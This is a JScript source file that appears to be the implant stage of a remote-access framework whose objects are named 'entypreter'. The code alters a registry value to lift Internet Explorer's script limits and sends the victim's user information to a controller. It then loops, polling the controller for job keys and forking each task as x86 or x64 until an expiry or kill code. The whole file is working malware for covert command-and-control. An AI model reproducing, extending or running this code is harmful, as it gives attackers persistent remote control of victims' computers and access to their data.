try
{
    if (entypreter.JOBKEY != "stage")
    {
        if (entypreter.isHTA())
        {
            //HKCU\SOFTWARE\Microsoft\Internet Explorer\Style\MaxScriptStatements = 0xFFFFFFFF
            var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles";
            var key = "MaxScriptStatements";
            entypreter.registry.write(entypreter.registry.HKCU, path, key, 0xFFFFFFFF, entypreter.registry.DWORD);
        }

        entypreter.work.report(entypreter.user.info());

        try {
          entypreter.work.fork("");
        } catch (e) {
          entypreter.work.error(e)
        }
        entypreter.exit();
    }
    else
    {
        if (entypreter.isHTA())
            DoWorkTimeout();
        else
            DoWorkLoop();
    }
}
catch (e)
{
    // todo: critical error reporting
    entypreter.work.error(e);
}

function DoWork()
{

    var epoch = new Date().getTime();
    var expire = parseInt(entypreter.EXPIRE);
    if (epoch > expire)
    {
        return false;
    }

    try
    {
        var work = entypreter.work.get();
        // 201 = x64 or x86
        // 202 = force x86
        if (work.status == 201 || work.status == 202)
        {
            if (work.responseText.length > 0) {
                var jobkey = work.responseText;
                entypreter.work.fork(jobkey, work.status == 202);
            }
        }
        else // if (work.status == 500) // kill code
        {
            return false;
        }
    }
    catch (e)
    {
        return false;
    }

    return true;
}

function DoWorkLoop()
{
    while (DoWork())
        ;

    entypreter.exit();
}

function DoWorkTimeout()
{
    for (var i = 0; i < 10; ++i)
    {
      if (!DoWork())
      {
          entypreter.exit();
          return;
      }
    }
    //window.setTimeout(DoWorkTimeoutCallback, 0);

    entypreter.work.fork("");
    entypreter.exit();
}
